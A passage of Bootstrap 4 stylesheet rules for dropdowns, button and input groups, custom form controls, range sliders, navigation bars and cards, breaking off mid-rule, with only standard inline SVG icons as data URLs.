    .dropright .dropdown-toggle::after {
      vertical-align: 0
    }

    .dropleft .dropdown-menu {
      top: 0;
      right: 100%;
      left: auto;
      margin-top: 0;
      margin-right: .125rem
    }

    .dropleft .dropdown-toggle::after {
      display: inline-block;
      width: 0;
      height: 0;
      margin-left: .255em;
      vertical-align: .255em;
      content: ""
    }

    .dropleft .dropdown-toggle::after {
      display: none
    }

    .dropleft .dropdown-toggle::before {
      display: inline-block;
      width: 0;
      height: 0;
      margin-right: .255em;
      vertical-align: .255em;
      content: "";
      border-top: .3em solid transparent;
      border-right: .3em solid;
      border-bottom: .3em solid transparent
    }

    .dropleft .dropdown-toggle:empty::after {
      margin-left: 0
    }

    .dropleft .dropdown-toggle::before {
      vertical-align: 0
    }

    .dropdown-menu[x-placement^=bottom],
    .dropdown-menu[x-placement^=left],
    .dropdown-menu[x-placement^=right],
    .dropdown-menu[x-placement^=top] {
      right: auto;
      bottom: auto
    }

    .dropdown-divider {
      height: 0;
      margin: .5rem 0;
      overflow: hidden;
      border-top: 1px solid #e9ecef
    }

    .dropdown-item {
      display: block;
      width: 100%;
      padding: .25rem 1.5rem;
      clear: both;
      font-weight: 400;
      color: #212529;
      text-align: inherit;
      white-space: nowrap;
      background-color: transparent;
      border: 0
    }

    .dropdown-item:focus,
    .dropdown-item:hover {
      color: #16181b;
      text-decoration: none;
      background-color: #f8f9fa
    }

    .dropdown-item.active,
    .dropdown-item:active {
      color: #fff;
      text-decoration: none;
      background-color: #007bff
    }

    .dropdown-item.disabled,
    .dropdown-item:disabled {
      color: #6c757d;
      background-color: transparent
    }

    .dropdown-menu.show {
      display: block
    }

    .dropdown-header {
      display: block;
      padding: .5rem 1.5rem;
      margin-bottom: 0;
      font-size: .875rem;
      color: #6c757d;
      white-space: nowrap
    }

    .dropdown-item-text {
      display: block;
      padding: .25rem 1.5rem;
      color: #212529
    }

    .btn-group,
    .btn-group-vertical {
      position: relative;
      display: -ms-inline-flexbox;
      display: inline-flex;
      vertical-align: middle
    }

    .btn-group-vertical>.btn,
    .btn-group>.btn {
      position: relative;
      -ms-flex: 0 1 auto;
      flex: 0 1 auto
    }

    .btn-group-vertical>.btn:hover,
    .btn-group>.btn:hover {
      z-index: 1
    }

    .btn-group-vertical>.btn.active,
    .btn-group-vertical>.btn:active,
    .btn-group-vertical>.btn:focus,
    .btn-group>.btn.active,
    .btn-group>.btn:active,
    .btn-group>.btn:focus {
      z-index: 1
    }

    .btn-group .btn+.btn,
    .btn-group .btn+.btn-group,
    .btn-group .btn-group+.btn,
    .btn-group .btn-group+.btn-group,
    .btn-group-vertical .btn+.btn,
    .btn-group-vertical .btn+.btn-group,
    .btn-group-vertical .btn-group+.btn,
    .btn-group-vertical .btn-group+.btn-group {
      margin-left: -1px
    }

    .btn-toolbar {
      display: -ms-flexbox;
      display: flex;
      -ms-flex-wrap: wrap;
      flex-wrap: wrap;
      -ms-flex-pack: start;
      justify-content: flex-start
    }

    .btn-toolbar .input-group {
      width: auto
    }

    .btn-group>.btn:first-child {
      margin-left: 0
    }

    .btn-group>.btn-group:not(:last-child)>.btn,
    .btn-group>.btn:not(:last-child):not(.dropdown-toggle) {
      border-top-right-radius: 0;
      border-bottom-right-radius: 0
    }

    .btn-group>.btn-group:not(:first-child)>.btn,
    .btn-group>.btn:not(:first-child) {
      border-top-left-radius: 0;
      border-bottom-left-radius: 0
    }

    .dropdown-toggle-split {
      padding-right: .5625rem;
      padding-left: .5625rem
    }

    .dropdown-toggle-split::after,
    .dropright .dropdown-toggle-split::after,
    .dropup .dropdown-toggle-split::after {
      margin-left: 0
    }

    .dropleft .dropdown-toggle-split::before {
      margin-right: 0
    }

    .btn-group-sm>.btn+.dropdown-toggle-split,
    .btn-sm+.dropdown-toggle-split {
      padding-right: .375rem;
      padding-left: .375rem
    }

    .btn-group-lg>.btn+.dropdown-toggle-split,
    .btn-lg+.dropdown-toggle-split {
      padding-right: .75rem;
      padding-left: .75rem
    }

    .btn-group-vertical {
      -ms-flex-direction: column;
      flex-direction: column;
      -ms-flex-align: start;
      align-items: flex-start;
      -ms-flex-pack: center;
      justify-content: center
    }

    .btn-group-vertical .btn,
    .btn-group-vertical .btn-group {
      width: 100%
    }

    .btn-group-vertical>.btn+.btn,
    .btn-group-vertical>.btn+.btn-group,
    .btn-group-vertical>.btn-group+.btn,
    .btn-group-vertical>.btn-group+.btn-group {
      margin-top: -1px;
      margin-left: 0
    }

    .btn-group-vertical>.btn-group:not(:last-child)>.btn,
    .btn-group-vertical>.btn:not(:last-child):not(.dropdown-toggle) {
      border-bottom-right-radius: 0;
      border-bottom-left-radius: 0
    }

    .btn-group-vertical>.btn-group:not(:first-child)>.btn,
    .btn-group-vertical>.btn:not(:first-child) {
      border-top-left-radius: 0;
      border-top-right-radius: 0
    }

    .btn-group-toggle>.btn,
    .btn-group-toggle>.btn-group>.btn {
      margin-bottom: 0
    }

    .btn-group-toggle>.btn input[type=checkbox],
    .btn-group-toggle>.btn input[type=radio],
    .btn-group-toggle>.btn-group>.btn input[type=checkbox],
    .btn-group-toggle>.btn-group>.btn input[type=radio] {
      position: absolute;
      clip: rect(0, 0, 0, 0);
      pointer-events: none
    }

    .input-group {
      position: relative;
      display: -ms-flexbox;
      display: flex;
      -ms-flex-wrap: wrap;
      flex-wrap: wrap;
      -ms-flex-align: stretch;
      align-items: stretch;
      width: 100%
    }

    .input-group>.custom-file,
    .input-group>.custom-select,
    .input-group>.form-control {
      position: relative;
      -ms-flex: 1 1 auto;
      flex: 1 1 auto;
      width: 1%;
      margin-bottom: 0
    }

    .input-group>.custom-file+.custom-file,
    .input-group>.custom-file+.custom-select,
    .input-group>.custom-file+.form-control,
    .input-group>.custom-select+.custom-file,
    .input-group>.custom-select+.custom-select,
    .input-group>.custom-select+.form-control,
    .input-group>.form-control+.custom-file,
    .input-group>.form-control+.custom-select,
    .input-group>.form-control+.form-control {
      margin-left: -1px
    }

    .input-group>.custom-file .custom-file-input:focus~.custom-file-label,
    .input-group>.custom-select:focus,
    .input-group>.form-control:focus {
      z-index: 3
    }

    .input-group>.custom-file .custom-file-input:focus {
      z-index: 4
    }

    .input-group>.custom-select:not(:last-child),
    .input-group>.form-control:not(:last-child) {
      border-top-right-radius: 0;
      border-bottom-right-radius: 0
    }

    .input-group>.custom-select:not(:first-child),
    .input-group>.form-control:not(:first-child) {
      border-top-left-radius: 0;
      border-bottom-left-radius: 0
    }

    .input-group>.custom-file {
      display: -ms-flexbox;
      display: flex;
      -ms-flex-align: center;
      align-items: center
    }

    .input-group>.custom-file:not(:last-child) .custom-file-label,
    .input-group>.custom-file:not(:last-child) .custom-file-label::after {
      border-top-right-radius: 0;
      border-bottom-right-radius: 0
    }

    .input-group>.custom-file:not(:first-child) .custom-file-label {
      border-top-left-radius: 0;
      border-bottom-left-radius: 0
    }

    .input-group-append,
    .input-group-prepend {
      display: -ms-flexbox;
      display: flex
    }

    .input-group-append .btn,
    .input-group-prepend .btn {
      position: relative;
      z-index: 2
    }

    .input-group-append .btn+.btn,
    .input-group-append .btn+.input-group-text,
    .input-group-append .input-group-text+.btn,
    .input-group-append .input-group-text+.input-group-text,
    .input-group-prepend .btn+.btn,
    .input-group-prepend .btn+.input-group-text,
    .input-group-prepend .input-group-text+.btn,
    .input-group-prepend .input-group-text+.input-group-text {
      margin-left: -1px
    }

    .input-group-prepend {
      margin-right: -1px
    }

    .input-group-append {
      margin-left: -1px
    }

    .input-group-text {
      display: -ms-flexbox;
      display: flex;
      -ms-flex-align: center;
      align-items: center;
      padding: .375rem .75rem;
      margin-bottom: 0;
      font-size: 1rem;
      font-weight: 400;
      line-height: 1.5;
      color: #495057;
      text-align: center;
      white-space: nowrap;
      background-color: #e9ecef;
      border: 1px solid #ced4da;
      border-radius: .25rem
    }

    .input-group-text input[type=checkbox],
    .input-group-text input[type=radio] {
      margin-top: 0
    }

    .input-group-lg>.form-control,
    .input-group-lg>.input-group-append>.btn,
    .input-group-lg>.input-group-append>.input-group-text,
    .input-group-lg>.input-group-prepend>.btn,
    .input-group-lg>.input-group-prepend>.input-group-text {
      height: calc(2.875rem + 2px);
      padding: .5rem 1rem;
      font-size: 1.25rem;
      line-height: 1.5;
      border-radius: .3rem
    }

    .input-group-sm>.form-control,
    .input-group-sm>.input-group-append>.btn,
    .input-group-sm>.input-group-append>.input-group-text,
    .input-group-sm>.input-group-prepend>.btn,
    .input-group-sm>.input-group-prepend>.input-group-text {
      height: calc(1.8125rem + 2px);
      padding: .25rem .5rem;
      font-size: .875rem;
      line-height: 1.5;
      border-radius: .2rem
    }

    .input-group>.input-group-append:last-child>.btn:not(:last-child):not(.dropdown-toggle),
    .input-group>.input-group-append:last-child>.input-group-text:not(:last-child),
    .input-group>.input-group-append:not(:last-child)>.btn,
    .input-group>.input-group-append:not(:last-child)>.input-group-text,
    .input-group>.input-group-prepend>.btn,
    .input-group>.input-group-prepend>.input-group-text {
      border-top-right-radius: 0;
      border-bottom-right-radius: 0
    }

    .input-group>.input-group-append>.btn,
    .input-group>.input-group-append>.input-group-text,
    .input-group>.input-group-prepend:first-child>.btn:not(:first-child),
    .input-group>.input-group-prepend:first-child>.input-group-text:not(:first-child),
    .input-group>.input-group-prepend:not(:first-child)>.btn,
    .input-group>.input-group-prepend:not(:first-child)>.input-group-text {
      border-top-left-radius: 0;
      border-bottom-left-radius: 0
    }

    .custom-control {
      position: relative;
      display: block;
      min-height: 1.5rem;
      padding-left: 1.5rem
    }

    .custom-control-inline {
      display: -ms-inline-flexbox;
      display: inline-flex;
      margin-right: 1rem
    }

    .custom-control-input {
      position: absolute;
      z-index: -1;
      opacity: 0
    }

    .custom-control-input:checked~.custom-control-label::before {
      color: #fff;
      background-color: #007bff
    }

    .custom-control-input:focus~.custom-control-label::before {
      box-shadow: 0 0 0 1px #fff, 0 0 0 .2rem rgba(0, 123, 255, .25)
    }

    .custom-control-input:active~.custom-control-label::before {
      color: #fff;
      background-color: #b3d7ff
    }

    .custom-control-input:disabled~.custom-control-label {
      color: #6c757d
    }

    .custom-control-input:disabled~.custom-control-label::before {
      background-color: #e9ecef
    }

    .custom-control-label {
      position: relative;
      margin-bottom: 0
    }

    .custom-control-label::before {
      position: absolute;
      top: .25rem;
      left: -1.5rem;
      display: block;
      width: 1rem;
      height: 1rem;
      pointer-events: none;
      content: "";
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
      background-color: #dee2e6
    }

    .custom-control-label::after {
      position: absolute;
      top: .25rem;
      left: -1.5rem;
      display: block;
      width: 1rem;
      height: 1rem;
      content: "";
      background-repeat: no-repeat;
      background-position: center center;
      background-size: 50% 50%
    }

    .custom-checkbox .custom-control-label::before {
      border-radius: .25rem
    }

    .custom-checkbox .custom-control-input:checked~.custom-control-label::before {
      background-color: #007bff
    }

    .custom-checkbox .custom-control-input:checked~.custom-control-label::after {
      background-image: url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8 8'%3E%3Cpath fill='%23fff' d='M6.564.75l-3.59 3.612-1.538-1.55L0 4.26 2.974 7.25 8 2.193z'/%3E%3C/svg%3E")
    }

    .custom-checkbox .custom-control-input:indeterminate~.custom-control-label::before {
      background-color: #007bff
    }

    .custom-checkbox .custom-control-input:indeterminate~.custom-control-label::after {
      background-image: url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 4 4'%3E%3Cpath stroke='%23fff' d='M0 2h4'/%3E%3C/svg%3E")
    }

    .custom-checkbox .custom-control-input:disabled:checked~.custom-control-label::before {
      background-color: rgba(0, 123, 255, .5)
    }

    .custom-checkbox .custom-control-input:disabled:indeterminate~.custom-control-label::before {
      background-color: rgba(0, 123, 255, .5)
    }

    .custom-radio .custom-control-label::before {
      border-radius: 50%
    }

    .custom-radio .custom-control-input:checked~.custom-control-label::before {
      background-color: #007bff
    }

    .custom-radio .custom-control-input:checked~.custom-control-label::after {
      background-image: url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='-4 -4 8 8'%3E%3Ccircle r='3' fill='%23fff'/%3E%3C/svg%3E")
    }

    .custom-radio .custom-control-input:disabled:checked~.custom-control-label::before {
      background-color: rgba(0, 123, 255, .5)
    }

    .custom-select {
      display: inline-block;
      width: 100%;
      height: calc(2.25rem + 2px);
      padding: .375rem 1.75rem .375rem .75rem;
      line-height: 1.5;
      color: #495057;
      vertical-align: middle;
      background: #fff url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 4 5'%3E%3Cpath fill='%23343a40' d='M2 0L0 2h4zm0 5L0 3h4z'/%3E%3C/svg%3E") no-repeat right .75rem center;
      background-size: 8px 10px;
      border: 1px solid #ced4da;
      border-radius: .25rem;
      -webkit-appearance: none;
      -moz-appearance: none;
      appearance: none
    }

    .custom-select:focus {
      border-color: #80bdff;
      outline: 0;
      box-shadow: 0 0 0 .2rem rgba(128, 189, 255, .5)
    }

    .custom-select:focus::-ms-value {
      color: #495057;
      background-color: #fff
    }

    .custom-select[multiple],
    .custom-select[size]:not([size="1"]) {
      height: auto;
      padding-right: .75rem;
      background-image: none
    }

    .custom-select:disabled {
      color: #6c757d;
      background-color: #e9ecef
    }

    .custom-select::-ms-expand {
      opacity: 0
    }

    .custom-select-sm {
      height: calc(1.8125rem + 2px);
      padding-top: .375rem;
      padding-bottom: .375rem;
      font-size: 75%
    }

    .custom-select-lg {
      height: calc(2.875rem + 2px);
      padding-top: .375rem;
      padding-bottom: .375rem;
      font-size: 125%
    }

    .custom-file {
      position: relative;
      display: inline-block;
      width: 100%;
      height: calc(2.25rem + 2px);
      margin-bottom: 0
    }

    .custom-file-input {
      position: relative;
      z-index: 2;
      width: 100%;
      height: calc(2.25rem + 2px);
      margin: 0;
      opacity: 0
    }

    .custom-file-input:focus~.custom-file-label {
      border-color: #80bdff;
      box-shadow: 0 0 0 .2rem rgba(0, 123, 255, .25)
    }

    .custom-file-input:focus~.custom-file-label::after {
      border-color: #80bdff
    }

    .custom-file-input:disabled~.custom-file-label {
      background-color: #e9ecef
    }

    .custom-file-input:lang(en)~.custom-file-label::after {
      content: "Browse"
    }

    .custom-file-label {
      position: absolute;
      top: 0;
      right: 0;
      left: 0;
      z-index: 1;
      height: calc(2.25rem + 2px);
      padding: .375rem .75rem;
      line-height: 1.5;
      color: #495057;
      background-color: #fff;
      border: 1px solid #ced4da;
      border-radius: .25rem
    }

    .custom-file-label::after {
      position: absolute;
      top: 0;
      right: 0;
      bottom: 0;
      z-index: 3;
      display: block;
      height: 2.25rem;
      padding: .375rem .75rem;
      line-height: 1.5;
      color: #495057;
      content: "Browse";
      background-color: #e9ecef;
      border-left: 1px solid #ced4da;
      border-radius: 0 .25rem .25rem 0
    }

    .custom-range {
      width: 100%;
      padding-left: 0;
      background-color: transparent;
      -webkit-appearance: none;
      -moz-appearance: none;
      appearance: none
    }

    .custom-range:focus {
      outline: 0
    }

    .custom-range:focus::-webkit-slider-thumb {
      box-shadow: 0 0 0 1px #fff, 0 0 0 .2rem rgba(0, 123, 255, .25)
    }

    .custom-range:focus::-moz-range-thumb {
      box-shadow: 0 0 0 1px #fff, 0 0 0 .2rem rgba(0, 123, 255, .25)
    }

    .custom-range:focus::-ms-thumb {
      box-shadow: 0 0 0 1px #fff, 0 0 0 .2rem rgba(0, 123, 255, .25)
    }

    .custom-range::-moz-focus-outer {
      border: 0
    }

    .custom-range::-webkit-slider-thumb {
      width: 1rem;
      height: 1rem;
      margin-top: -.25rem;
      background-color: #007bff;
      border: 0;
      border-radius: 1rem;
      transition: background-color .15s ease-in-out, border-color .15s ease-in-out, box-shadow .15s ease-in-out;
      -webkit-appearance: none;
      appearance: none
    }

    @media screen and (prefers-reduced-motion:reduce) {
      .custom-range::-webkit-slider-thumb {
        transition: none
      }
    }

    .custom-range::-webkit-slider-thumb:active {
      background-color: #b3d7ff
    }

    .custom-range::-webkit-slider-runnable-track {
      width: 100%;
      height: .5rem;
      color: transparent;
      cursor: pointer;
      background-color: #dee2e6;
      border-color: transparent;
      border-radius: 1rem
    }

    .custom-range::-moz-range-thumb {
      width: 1rem;
      height: 1rem;
      background-color: #007bff;
      border: 0;
      border-radius: 1rem;
      transition: background-color .15s ease-in-out, border-color .15s ease-in-out, box-shadow .15s ease-in-out;
      -moz-appearance: none;
      appearance: none
    }

    @media screen and (prefers-reduced-motion:reduce) {
      .custom-range::-moz-range-thumb {
        transition: none
      }
    }

    .custom-range::-moz-range-thumb:active {
      background-color: #b3d7ff
    }

    .custom-range::-moz-range-track {
      width: 100%;
      height: .5rem;
      color: transparent;
      cursor: pointer;
      background-color: #dee2e6;
      border-color: transparent;
      border-radius: 1rem
    }

    .custom-range::-ms-thumb {
      width: 1rem;
      height: 1rem;
      margin-top: 0;
      margin-right: .2rem;
      margin-left: .2rem;
      background-color: #007bff;
      border: 0;
      border-radius: 1rem;
      transition: background-color .15s ease-in-out, border-color .15s ease-in-out, box-shadow .15s ease-in-out;
      appearance: none
    }

    @media screen and (prefers-reduced-motion:reduce) {
      .custom-range::-ms-thumb {
        transition: none
      }
    }

    .custom-range::-ms-thumb:active {
      background-color: #b3d7ff
    }

    .custom-range::-ms-track {
      width: 100%;
      height: .5rem;
      color: transparent;
      cursor: pointer;
      background-color: transparent;
      border-color: transparent;
      border-width: .5rem
    }

    .custom-range::-ms-fill-lower {
      background-color: #dee2e6;
      border-radius: 1rem
    }

    .custom-range::-ms-fill-upper {
      margin-right: 15px;
      background-color: #dee2e6;
      border-radius: 1rem
    }

    .custom-control-label::before,
    .custom-file-label,
    .custom-select {
      transition: background-color .15s ease-in-out, border-color .15s ease-in-out, box-shadow .15s ease-in-out
    }

    @media screen and (prefers-reduced-motion:reduce) {

      .custom-control-label::before,
      .custom-file-label,
      .custom-select {
        transition: none
      }
    }

    .nav {
      display: -ms-flexbox;
      display: flex;
      -ms-flex-wrap: wrap;
      flex-wrap: wrap;
      padding-left: 0;
      margin-bottom: 0;
      list-style: none
    }

    .nav-link {
      display: block;
      padding: .5rem 1rem
    }

    .nav-link:focus,
    .nav-link:hover {
      text-decoration: none
    }

    .nav-link.disabled {
      color: #6c757d
    }

    .nav-tabs {
      border-bottom: 1px solid #dee2e6
    }

    .nav-tabs .nav-item {
      margin-bottom: -1px
    }

    .nav-tabs .nav-link {
      border: 1px solid transparent;
      border-top-left-radius: .25rem;
      border-top-right-radius: .25rem
    }

    .nav-tabs .nav-link:focus,
    .nav-tabs .nav-link:hover {
      border-color: #e9ecef #e9ecef #dee2e6
    }

    .nav-tabs .nav-link.disabled {
      color: #6c757d;
      background-color: transparent;
      border-color: transparent
    }

    .nav-tabs .nav-item.show .nav-link,
    .nav-tabs .nav-link.active {
      color: #495057;
      background-color: #fff;
      border-color: #dee2e6 #dee2e6 #fff
    }

    .nav-tabs .dropdown-menu {
      margin-top: -1px;
      border-top-left-radius: 0;
      border-top-right-radius: 0
    }

    .nav-pills .nav-link {
      border-radius: .25rem
    }

    .nav-pills .nav-link.active,
    .nav-pills .show>.nav-link {
      color: #fff;
      background-color: #007bff
    }

    .nav-fill .nav-item {
      -ms-flex: 1 1 auto;
      flex: 1 1 auto;
      text-align: center
    }

    .nav-justified .nav-item {
      -ms-flex-preferred-size: 0;
      flex-basis: 0;
      -ms-flex-positive: 1;
      flex-grow: 1;
      text-align: center
    }

    .tab-content>.tab-pane {
      display: none
    }

    .tab-content>.active {
      display: block
    }

    .navbar {
      position: relative;
      display: -ms-flexbox;
      display: flex;
      -ms-flex-wrap: wrap;
      flex-wrap: wrap;
      -ms-flex-align: center;
      align-items: center;
      -ms-flex-pack: justify;
      justify-content: space-between;
      padding: .5rem 1rem
    }

    .navbar>.container,
    .navbar>.container-fluid {
      display: -ms-flexbox;
      display: flex;
      -ms-flex-wrap: wrap;
      flex-wrap: wrap;
      -ms-flex-align: center;
      align-items: center;
      -ms-flex-pack: justify;
      justify-content: space-between
    }

    .navbar-brand {
      display: inline-block;
      padding-top: .3125rem;
      padding-bottom: .3125rem;
      margin-right: 1rem;
      font-size: 1.25rem;
      line-height: inherit;
      white-space: nowrap
    }

    .navbar-brand:focus,
    .navbar-brand:hover {
      text-decoration: none
    }

    .navbar-nav {
      display: -ms-flexbox;
      display: flex;
      -ms-flex-direction: column;
      flex-direction: column;
      padding-left: 0;
      margin-bottom: 0;
      list-style: none
    }

    .navbar-nav .nav-link {
      padding-right: 0;
      padding-left: 0
    }

    .navbar-nav .dropdown-menu {
      position: static;
      float: none
    }

    .navbar-text {
      display: inline-block;
      padding-top: .5rem;
      padding-bottom: .5rem
    }

    .navbar-collapse {
      -ms-flex-preferred-size: 100%;
      flex-basis: 100%;
      -ms-flex-positive: 1;
      flex-grow: 1;
      -ms-flex-align: center;
      align-items: center
    }

    .navbar-toggler {
      padding: .25rem .75rem;
      font-size: 1.25rem;
      line-height: 1;
      background-color: transparent;
      border: 1px solid transparent;
      border-radius: .25rem
    }

    .navbar-toggler:focus,
    .navbar-toggler:hover {
      text-decoration: none
    }

    .navbar-toggler:not(:disabled):not(.disabled) {
      cursor: pointer
    }

    .navbar-toggler-icon {
      display: inline-block;
      width: 1.5em;
      height: 1.5em;
      vertical-align: middle;
      content: "";
      background: no-repeat center center;
      background-size: 100% 100%
    }

    @media (max-width:575.98px) {

      .navbar-expand-sm>.container,
      .navbar-expand-sm>.container-fluid {
        padding-right: 0;
        padding-left: 0
      }
    }

    @media (min-width:576px) {
      .navbar-expand-sm {
        -ms-flex-flow: row nowrap;
        flex-flow: row nowrap;
        -ms-flex-pack: start;
        justify-content: flex-start
      }

      .navbar-expand-sm .navbar-nav {
        -ms-flex-direction: row;
        flex-direction: row
      }

      .navbar-expand-sm .navbar-nav .dropdown-menu {
        position: absolute
      }

      .navbar-expand-sm .navbar-nav .nav-link {
        padding-right: .5rem;
        padding-left: .5rem
      }

      .navbar-expand-sm>.container,
      .navbar-expand-sm>.container-fluid {
        -ms-flex-wrap: nowrap;
        flex-wrap: nowrap
      }

      .navbar-expand-sm .navbar-collapse {
        display: -ms-flexbox !important;
        display: flex !important;
        -ms-flex-preferred-size: auto;
        flex-basis: auto
      }

      .navbar-expand-sm .navbar-toggler {
        display: none
      }
    }

    @media (max-width:767.98px) {

      .navbar-expand-md>.container,
      .navbar-expand-md>.container-fluid {
        padding-right: 0;
        padding-left: 0
      }
    }

    @media (min-width:768px) {
      .navbar-expand-md {
        -ms-flex-flow: row nowrap;
        flex-flow: row nowrap;
        -ms-flex-pack: start;
        justify-content: flex-start
      }

      .navbar-expand-md .navbar-nav {
        -ms-flex-direction: row;
        flex-direction: row
      }

      .navbar-expand-md .navbar-nav .dropdown-menu {
        position: absolute
      }

      .navbar-expand-md .navbar-nav .nav-link {
        padding-right: .5rem;
        padding-left: .5rem
      }

      .navbar-expand-md>.container,
      .navbar-expand-md>.container-fluid {
        -ms-flex-wrap: nowrap;
        flex-wrap: nowrap
      }

      .navbar-expand-md .navbar-collapse {
        display: -ms-flexbox !important;
        display: flex !important;
        -ms-flex-preferred-size: auto;
        flex-basis: auto
      }

      .navbar-expand-md .navbar-toggler {
        display: none
      }
    }

    @media (max-width:991.98px) {

      .navbar-expand-lg>.container,
      .navbar-expand-lg>.container-fluid {
        padding-right: 0;
        padding-left: 0
      }
    }

    @media (min-width:992px) {
      .navbar-expand-lg {
        -ms-flex-flow: row nowrap;
        flex-flow: row nowrap;
        -ms-flex-pack: start;
        justify-content: flex-start
      }

      .navbar-expand-lg .navbar-nav {
        -ms-flex-direction: row;
        flex-direction: row
      }

      .navbar-expand-lg .navbar-nav .dropdown-menu {
        position: absolute
      }

      .navbar-expand-lg .navbar-nav .nav-link {
        padding-right: .5rem;
        padding-left: .5rem
      }

      .navbar-expand-lg>.container,
      .navbar-expand-lg>.container-fluid {
        -ms-flex-wrap: nowrap;
        flex-wrap: nowrap
      }

      .navbar-expand-lg .navbar-collapse {
        display: -ms-flexbox !important;
        display: flex !important;
        -ms-flex-preferred-size: auto;
        flex-basis: auto
      }

      .navbar-expand-lg .navbar-toggler {
        display: none
      }
    }

    @media (max-width:1199.98px) {

      .navbar-expand-xl>.container,
      .navbar-expand-xl>.container-fluid {
        padding-right: 0;
        padding-left: 0
      }
    }

    @media (min-width:1200px) {
      .navbar-expand-xl {
        -ms-flex-flow: row nowrap;
        flex-flow: row nowrap;
        -ms-flex-pack: start;
        justify-content: flex-start
      }

      .navbar-expand-xl .navbar-nav {
        -ms-flex-direction: row;
        flex-direction: row
      }

      .navbar-expand-xl .navbar-nav .dropdown-menu {
        position: absolute
      }

      .navbar-expand-xl .navbar-nav .nav-link {
        padding-right: .5rem;
        padding-left: .5rem
      }

      .navbar-expand-xl>.container,
      .navbar-expand-xl>.container-fluid {
        -ms-flex-wrap: nowrap;
        flex-wrap: nowrap
      }

      .navbar-expand-xl .navbar-collapse {
        display: -ms-flexbox !important;
        display: flex !important;
        -ms-flex-preferred-size: auto;
        flex-basis: auto
      }

      .navbar-expand-xl .navbar-toggler {
        display: none
      }
    }

    .navbar-expand {
      -ms-flex-flow: row nowrap;
      flex-flow: row nowrap;
      -ms-flex-pack: start;
      justify-content: flex-start
    }

    .navbar-expand>.container,
    .navbar-expand>.container-fluid {
      padding-right: 0;
      padding-left: 0
    }

    .navbar-expand .navbar-nav {
      -ms-flex-direction: row;
      flex-direction: row
    }

    .navbar-expand .navbar-nav .dropdown-menu {
      position: absolute
    }

    .navbar-expand .navbar-nav .nav-link {
      padding-right: .5rem;
      padding-left: .5rem
    }

    .navbar-expand>.container,
    .navbar-expand>.container-fluid {
      -ms-flex-wrap: nowrap;
      flex-wrap: nowrap
    }

    .navbar-expand .navbar-collapse {
      display: -ms-flexbox !important;
      display: flex !important;
      -ms-flex-preferred-size: auto;
      flex-basis: auto
    }

    .navbar-expand .navbar-toggler {
      display: none
    }

    .navbar-light .navbar-brand {
      color: rgba(0, 0, 0, .9)
    }

    .navbar-light .navbar-brand:focus,
    .navbar-light .navbar-brand:hover {
      color: rgba(0, 0, 0, .9)
    }

    .navbar-light .navbar-nav .nav-link {
      color: rgba(0, 0, 0, .5)
    }

    .navbar-light .navbar-nav .nav-link:focus,
    .navbar-light .navbar-nav .nav-link:hover {
      color: rgba(0, 0, 0, .7)
    }

    .navbar-light .navbar-nav .nav-link.disabled {
      color: rgba(0, 0, 0, .3)
    }

    .navbar-light .navbar-nav .active>.nav-link,
    .navbar-light .navbar-nav .nav-link.active,
    .navbar-light .navbar-nav .nav-link.show,
    .navbar-light .navbar-nav .show>.nav-link {
      color: rgba(0, 0, 0, .9)
    }

    .navbar-light .navbar-toggler {
      color: rgba(0, 0, 0, .5);
      border-color: rgba(0, 0, 0, .1)
    }

    .navbar-light .navbar-toggler-icon {
      background-image: url("data:image/svg+xml;charset=utf8,%3Csvg viewBox='0 0 30 30' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath stroke='rgba(0, 0, 0, 0.5)' stroke-width='2' stroke-linecap='round' stroke-miterlimit='10' d='M4 7h22M4 15h22M4 23h22'/%3E%3C/svg%3E")
    }

    .navbar-light .navbar-text {
      color: rgba(0, 0, 0, .5)
    }

    .navbar-light .navbar-text a {
      color: rgba(0, 0, 0, .9)
    }

    .navbar-light .navbar-text a:focus,
    .navbar-light .navbar-text a:hover {
      color: rgba(0, 0, 0, .9)
    }

    .navbar-dark .navbar-brand {
      color: #fff
    }

    .navbar-dark .navbar-brand:focus,
    .navbar-dark .navbar-brand:hover {
      color: #fff
    }

    .navbar-dark .navbar-nav .nav-link {
      color: rgba(255, 255, 255, .5)
    }

    .navbar-dark .navbar-nav .nav-link:focus,
    .navbar-dark .navbar-nav .nav-link:hover {
      color: rgba(255, 255, 255, .75)
    }

    .navbar-dark .navbar-nav .nav-link.disabled {
      color: rgba(255, 255, 255, .25)
    }

    .navbar-dark .navbar-nav .active>.nav-link,
    .navbar-dark .navbar-nav .nav-link.active,
    .navbar-dark .navbar-nav .nav-link.show,
    .navbar-dark .navbar-nav .show>.nav-link {
      color: #fff
    }

    .navbar-dark .navbar-toggler {
      color: rgba(255, 255, 255, .5);
      border-color: rgba(255, 255, 255, .1)
    }

    .navbar-dark .navbar-toggler-icon {
      background-image: url("data:image/svg+xml;charset=utf8,%3Csvg viewBox='0 0 30 30' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath stroke='rgba(255, 255, 255, 0.5)' stroke-width='2' stroke-linecap='round' stroke-miterlimit='10' d='M4 7h22M4 15h22M4 23h22'/%3E%3C/svg%3E")
    }

    .navbar-dark .navbar-text {
      color: rgba(255, 255, 255, .5)
    }

    .navbar-dark .navbar-text a {
      color: #fff
    }

    .navbar-dark .navbar-text a:focus,
    .navbar-dark .navbar-text a:hover {
      color: #fff
    }

    .card {
      position: relative;
      display: -ms-flexbox;
      display: flex;
      -ms-flex-direction: column;
      flex-direction: column;
      min-width: 0;
      word-wrap: break-word;
      background-color: #fff;
      background-clip: border-box;
      border: 1px solid rgba(0, 0, 0, .125);
      border-radius: .25rem
    }

    .card>hr {
      margin-right: 0;
      margin-left: 0
    }

    .card>.list-group:first-child .list-group-item:first-child {
      border-top-left-radius: .25rem;
      border-top-right-radius: .25rem
    }

    .card>.list-group:last-child .list-group-item:last-child {
      border-bottom-right-radius: .25rem;
      border-bottom-left-radius: .25rem
    }

    .card-body {
      -ms-flex: 1 1 auto;
      flex: 1 1 auto;
      padding: 1.25rem
    }

    .card-title {
      margin-bottom: .75rem
    }

    .card-subtitle {
      margin-top: -.375rem;
      margin-bottom: 0
    }

    .card-text:last-child {
      margin-bottom: 0
    }

    .card-link:hover {
      text-decoration: none
    }

    .card-link+.card-link {
